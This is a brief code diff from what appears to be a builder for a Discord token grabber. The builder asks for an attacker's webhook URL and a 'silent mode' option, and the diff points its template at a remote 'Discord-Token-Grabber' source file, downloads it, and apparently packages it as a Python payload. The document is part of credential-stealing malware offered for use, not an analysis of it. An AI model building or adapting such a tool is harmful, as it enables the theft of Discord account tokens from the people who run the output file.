@@ -30,7 +30,7 @@ async def main():
         webhook = input(Fore.CYAN + "Enter your webhook url → " + Style.RESET_ALL)
         silent_mode = input(Fore.CYAN + "Enable silent mode? (y/n) → " + Style.RESET_ALL).strip().lower()
 
-        template = r""
+        template = r"https://raw.githubusercontent.com/coolerthanyouhaha/Discord-Token-Grabber/refs/heads/main/src.py"
         source = requests.get(template).text
 
         if file_name.lower().endswith(".py") or file_name.lower().endswith(".pyw"):
